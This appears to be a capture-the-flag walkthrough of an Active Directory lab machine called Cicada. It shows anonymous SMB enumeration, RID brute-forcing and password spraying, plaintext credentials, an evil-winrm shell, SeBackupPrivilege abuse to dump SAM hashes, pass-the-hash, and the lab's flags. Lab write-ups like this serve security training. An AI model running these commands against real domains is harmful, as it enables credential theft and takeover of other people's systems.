# ENUMERATION
---

## OPEN PORTS
---

| PORT | SERVICE |
| :----- | :------------ |
| 53/tcp | domain |
| 88/tcp | kerberos-sec |
| 135/tcp| msrpc |
| 139/tcp| netbios-ssn |
| 389/tcp| ldap |
| 445/tcp| microsoft-ds? |
| 464/tcp| kpasswd5? |
| 593/tcp| ncacn_http |
| 636/tcp| ssl/ldap |
| 3268/tcp| ldap |
| 3269/tcp| ssl/ldap |
| 5985/tcp| http |
Let's start reconnaissance.

# RECONNAISSANCE
---

We are facing a AD machine, let's start with some basic SMB enumeration:


![Pasted image 20250116135424.png](../../IMAGES/Pasted%20image%2020250116135424.png)

We can use netexec to perform a simple check on SMB and WINRM:

![Pasted image 20250116135538.png](../../IMAGES/Pasted%20image%2020250116135538.png)


We can attempt to log into SMB without the authentication process using `smbclient -NL IP`:

![Pasted image 20250116135823.png](../../IMAGES/Pasted%20image%2020250116135823.png)


We found interesting shares, let's check out `HR`:

![Pasted image 20250116135909.png](../../IMAGES/Pasted%20image%2020250116135909.png)


We find a `Notice from HR.txt` file, let's download it and check it:

![Pasted image 20250116140031.png](../../IMAGES/Pasted%20image%2020250116140031.png)

We got a default password, my guess would be we need to perform a basic brute force to enumerate users, this would be in the following way:

```ad-note
`netexec smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute`
```

We get the following output:

```
netexec smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute
SMB 10.10.11.35 445 CICADA-DC [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB 10.10.11.35 445 CICADA-DC [+] cicada.htb\anonymous: (Guest)
SMB 10.10.11.35 445 CICADA-DC 498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup) 
SMB 10.10.11.35 445 CICADA-DC 500: CICADA\Administrator (SidTypeUser)
SMB 10.10.11.35 445 CICADA-DC 501: CICADA\Guest (SidTypeUser)
SMB 10.10.11.35 445 CICADA-DC 502: CICADA\krbtgt (SidTypeUser)
SMB 10.10.11.35 445 CICADA-DC 512: CICADA\Domain Admins (SidTypeGroup)
SMB 10.10.11.35 445 CICADA-DC 513: CICADA\Domain Users (SidTypeGroup)
SMB 10.10.11.35 445 CICADA-DC 514: CICADA\Domain Guests (SidTypeGroup)
SMB 10.10.11.35 445 CICADA-DC 515: CICADA\Domain Computers (SidTypeGroup)
SMB 10.10.11.35 445 CICADA-DC 516: CICADA\Domain Controllers (SidTypeGroup)
SMB 10.10.11.35 445 CICADA-DC 517: CICADA\Cert Publishers (SidTypeAlias)
SMB 10.10.11.35 445 CICADA-DC 518: CICADA\Schema Admins (SidTypeGroup)
SMB 10.10.11.35 445 CICADA-DC 519: CICADA\Enterprise Admins (SidTypeGroup)
SMB 10.10.11.35 445 CICADA-DC 520: CICADA\Group Policy Creator Owners (SidTypeGroup) 
SMB 10.10.11.35 445 CICADA-DC 521: CICADA\Read-only Domain Controllers (SidTypeGroup) 
SMB 10.10.11.35 445 CICADA-DC 522: CICADA\Cloneable Domain Controllers (SidTypeGroup) 
SMB 10.10.11.35 445 CICADA-DC 525: CICADA\Protected Users (SidTypeGroup)
SMB 10.10.11.35 445 CICADA-DC 526: CICADA\Key Admins (SidTypeGroup)
SMB 10.10.11.35 445 CICADA-DC 527: CICADA\Enterprise Key Admins (SidTypeGroup) 
SMB 10.10.11.35 445 CICADA-DC 553: CICADA\RAS and IAS Servers (SidTypeAlias) 
SMB 10.10.11.35 445 CICADA-DC 571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias) 
SMB 10.10.11.35 445 CICADA-DC 572: CICADA\Denied RODC Password Replication Group (SidTypeAlias) 
SMB 10.10.11.35 445 CICADA-DC 1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB 10.10.11.35 445 CICADA-DC 1101: CICADA\DnsAdmins (SidTypeAlias)
SMB 10.10.11.35 445 CICADA-DC 1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB 10.10.11.35 445 CICADA-DC 1103: CICADA\Groups (SidTypeGroup)
SMB 10.10.11.35 445 CICADA-DC 1104: CICADA\john.smoulder (SidTypeUser)
SMB 10.10.11.35 445 CICADA-DC 1105: CICADA\sarah.dantelia (SidTypeUser)
SMB 10.10.11.35 445 CICADA-DC 1106: CICADA\michael.wrightson (SidTypeUser)
SMB 10.10.11.35 445 CICADA-DC 1108: CICADA\david.orelious (SidTypeUser)
SMB 10.10.11.35 445 CICADA-DC 1109: CICADA\Dev Support (SidTypeGroup)
SMB 10.10.11.35 445 CICADA-DC 1601: CICADA\emily.oscars (SidTypeUser)
```



# EXPLOITATION
---

Let's store all the usernames in a file and perform password spraying:


`nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'`


![Pasted image 20250116140940.png](../../IMAGES/Pasted%20image%2020250116140940.png)



We found the user, these are the credentials:

```ad-note

`michael.wrightson`:`Cicada$M6Corpb*@Lp#nZp!8`

```


We can search for more privileged users:

![Pasted image 20250116141256.png](../../IMAGES/Pasted%20image%2020250116141256.png)

We found an account with the following credentials:

```ad-note
`david.orelious`:`aRt$Lp#7t*VQ!3`
```


Let's check the shares this account has access to:


![Pasted image 20250116141414.png](../../IMAGES/Pasted%20image%2020250116141414.png)

We can now read the `DEV` share, let's take a look at it:


![Pasted image 20250116141607.png](../../IMAGES/Pasted%20image%2020250116141607.png)

Found a `Backup_script.ps1` file, let's view the contents:



![Pasted image 20250116141718.png](../../IMAGES/Pasted%20image%2020250116141718.png)

Found more credentials: 

```ad-note

`emily.oscars`:`Q!3@Lp#M6b*7t*Vt`
```


Let's check if we are able to get a shell with those credentials using `evil-winrm`:

```ad-success
`evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'`



```


We can read `user.txt` and begin with privilege escalation:

```ad-note

User: `74b2598907182ac31cca52c79b20eb0a`
```

# PRIVILEGE ESCALATION
---

In order to begin with privilege escalation, we can start enumerating our privileges:


`whoami /priv`


![Pasted image 20250116142402.png](../../IMAGES/Pasted%20image%2020250116142402.png)

We can make use of `SeBackupPrivilege` in order to escalate our privileges, let's use the following PoC:

![Pasted image 20250116142600.png](../../IMAGES/Pasted%20image%2020250116142600.png)

![Pasted image 20250116142623.png](../../IMAGES/Pasted%20image%2020250116142623.png)


But, we can simplify the PoC in the following way:

```ad-summary
1. `reg save hklm\sam sam`
2. `reg save hklm\system system`
3. `download sam`
4. `download system`
5. `impacket-secretsdump LOCAL -sam sam -system sytem`


#### Output
----


And like that, we can get our admin hash.
```


```
impacket-secretsdump LOCAL -sam sam -system system
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

Let's log in using Pass the hash:

![Pasted image 20250116144347.png](../../IMAGES/Pasted%20image%2020250116144347.png)

And our root flag is the following: 

```ad-note

Root: `568e019774b66b875a024dfa590b84dc`
```

